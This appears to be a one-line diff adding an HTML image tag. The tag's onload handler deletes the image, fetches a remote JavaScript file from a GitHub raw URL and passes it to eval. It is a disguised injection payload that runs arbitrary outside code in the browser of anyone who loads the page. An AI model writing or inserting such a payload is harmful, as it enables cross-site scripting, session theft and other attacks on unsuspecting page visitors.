@@ -1,0 +1,1 @@
+- <img src="https://file.garden/ae50sn0rViu-4ETl/image_2026-05-08_224029239.png" height="100" width="100" onload="this.remove();fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/OUTRO.js').then(r=>r.text()).then(eval);">
